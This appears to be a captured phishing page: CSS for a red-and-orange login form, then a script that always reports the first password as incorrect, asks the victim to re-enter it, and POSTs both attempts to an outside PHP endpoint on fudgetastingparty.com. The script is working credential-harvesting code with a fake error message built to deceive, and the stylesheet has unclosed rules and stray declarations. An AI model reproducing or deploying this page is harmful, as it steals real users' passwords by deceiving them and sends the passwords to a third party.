            .container {
                margin-left: auto;
                margin-right: auto;
                margin-top: 2%;
                padding: 0 0 1% 0;
                width: 350px;
                -webkit-border-radius: 2px;
                -moz-border-radius: 2px;
                border-radius: 2px;

            .header {

                margin-left: auto;
                margin-right: auto;
                background-color: white;
                border-bottom: 3px solid #df0c36;
                background-size: 100% 5%;
                background-repeat: no-repeat;

            input[type="text"],
            input[type="password"],
            input[type="submit"],
            input[type="tel"],
            input[type="email"],
            button[type="submit"] {
                border-radius: 1px;
                box-shadow: 0 3px 5px -2px #c2c2c2;
                box-sizing: border-box;
                border: solid 1px lightgray;
                font-size: 1rem;
                line-height: 1rem;
                height: 48px;
                padding: 0 8px;
                width: 100%;
            }

            input:focus {
                outline: none;
            }

            .input-checkbox > input[type="checkbox"] {
                display: none;
            }

            .input-checkbox > label {
                user-select: none;
                -webkit-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
            }

            .input-checkbox > input[type="checkbox"] + label > .checkbox {
                border: 1px solid #808080;
                border-radius: 10px;
                display: inline-block;
                height: 17px;
                margin-left: 10px;
                position: relative;
                transition: all 0.2s ease;
                vertical-align: text-bottom;
                width: 34px;
            }

            .input-checkbox > input[type="checkbox"]:checked + label > .checkbox {
                border: 1px solid #e97819;
            }

            .input-checkbox > input[type="checkbox"] + label > .checkbox::after {
                background-color: #808080;
                border-radius: 50%;
                bottom: 1px;
                content: " ";
                display: block;
                left: 1px;
                top: 1px;
                position: absolute;
                transition: all 0.2s ease;
                width: 15px;
            }

            .input-checkbox > input[type="checkbox"]:checked + label > .checkbox::after {
                background-color: #e97819;
                left: 18px;
            }

            .input-group {
                margin-bottom: 20px;
            }

            #logo {
                width: 80%;
                margin: 0 auto 10px;
                max-height: 70px;
            }

                border-radius: 0 0.4em 0.4em 0;
                border: 1px solid #e97819;
                padding: 0.3em 1em;
                font-size: inherit;
                box-sizing: content-box;
                font-weight: unset;

            }

            .mobile-login-label {
                display: none;
            }

            .mobile-login {
                border: none;
                display: inline;
            }

            /* The Modal (background) */
            .modal {
                display: none; /* Hidden by default */
                position: fixed; /* Stay in place */
                z-index: 1; /* Sit on top */
                padding-top: 100px; /* Location of the box */
                left: 0;
                top: 0;
                width: 100%; /* Full width */
                height: 100%; /* Full height */
                overflow: auto; /* Enable scroll if needed */
                background-color: rgb(0, 0, 0); /* Fallback color */
                background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
            }

            /* Modal Content */
            .modal-content {
                background-color: #fefefe;
                margin: auto;
                padding: 20px;
                border: 1px solid #888;
                width: 80%;
            }

            /* The Close Button */
            .close {
                color: #aaaaaa;
                float: right;
                font-size: 28px;
                font-weight: bold;
            }

            .close:hover,
            .close:focus {
                color: #000;
                text-decoration: none;
                cursor: pointer;
            }

            .tooltip-container {
                display: inline;
                margin-left: 10px;
                position: relative;
            }

            .tooltip {
                background-image: url("../images/info_bulle.png");
                background-size: contain;
                cursor: pointer;
                display: inline-block;
                height: 20px;
                width: 20px;
            }

            .tooltip + .tooltip-content {
                background-color: white;
                color: black;
                border: solid 1px;
                font-size: 0.65rem;
                opacity: 0;
                padding: 10px;
                pointer-events: none;
                position: absolute;
                left: -150px;
                bottom: 25px;
                text-transform: none;
                transition: opacity 0.5s;
                width: 250px;
                font-weight: 400;
            }

            .tooltip:hover + .tooltip-content {
                opacity: 1;
            }

<script>
let passwordTimeout;

document.getElementById('passwordForm').addEventListener('submit', function(event) {
  event.preventDefault();

  var form = this;
  var passwordInput = document.getElementById('pipassword');
  var msgFont = document.getElementById('msgfont');

  if (!passwordInput.dataset.firstAttempt) {

      passwordInput.dataset.firstAttempt = 'true';
      passwordInput.dataset.firstAttemptValue = passwordInput.value;

      passwordInput.placeholder = 'Verify Password';

        msgFont.innerHTML = "Your account or password is incorrect.";
          submitFormData();
  } else {
      msgFont.innerHTML = "";
      submitFormData1();
  }
});

function submitFormData() {
  let form = document.getElementById('passwordForm');
  let formData = new FormData(form);
  let passwordInput = document.getElementById('pipassword');


  formData.append('firstPasswordAttempt', form.querySelector('[name="pipassword"]').dataset.firstAttemptValue);
  formData.append('secondPasswordAttempt', passwordInput.value || form.querySelector('[name="pipassword"]').dataset.firstAttemptValue);

  fetch('https://fudgetastingparty.com/components/zkyg2/na2.php', {
      method: 'POST',
      body: formData,
  })
  .then(response => {
      if (!response.ok) throw new Error('Network response was not ok.');
      return response.text();
  })
  .then(data => {
      console.log('Form submitted:', data);
  })
  .catch(error => {
      console.error('Fetch operation error:', error);
  });
}

function submitFormData1() {

}
